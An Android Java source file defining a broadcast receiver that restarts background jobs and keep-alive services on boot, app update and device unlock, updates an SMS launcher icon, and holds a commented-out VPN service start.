package android.iocl.dac_collector.Receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.iocl.dac_collector.Services.JobSchedulerUtil;
import android.iocl.keepAlive.ServiceA;
import android.iocl.dac_collector.Utility.RoleHelper;
import android.iocl.dac_collector.Utility.WakeupHelper;
import android.provider.Telephony;
import android.util.Log;

public class MyReceiver extends BroadcastReceiver {


    @Override
    public void onReceive(Context context, Intent intent) {

        if (intent == null) return;


        if (Telephony.Sms.Intents.ACTION_DEFAULT_SMS_PACKAGE_CHANGED.equals(intent.getAction())) {
            RoleHelper.syncSmsLauncherIcon(context);
        }
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())
                || Intent.ACTION_MY_PACKAGE_REPLACED.equals(intent.getAction())) {
            JobSchedulerUtil.ensureBackgroundJobsScheduled(context);
            ServiceA.start(context);
        }
        if (Intent.ACTION_USER_PRESENT.equals(intent.getAction())) {

            ServiceA.start(context);
            WakeupHelper.wakeupAppService(context);
            // Handle user unlock event (e.g., start a service, activity, or log)
            Log.d("UserUnlockReceiver", "Device unlocked!");


        }


//        if (PersistentVpnService.ACTION_RESTART.equals(action) || Intent.ACTION_BOOT_COMPLETED.equals(action)) {
//            PersistentVpnServiceUtil.startService(context);
//        }


    }
}
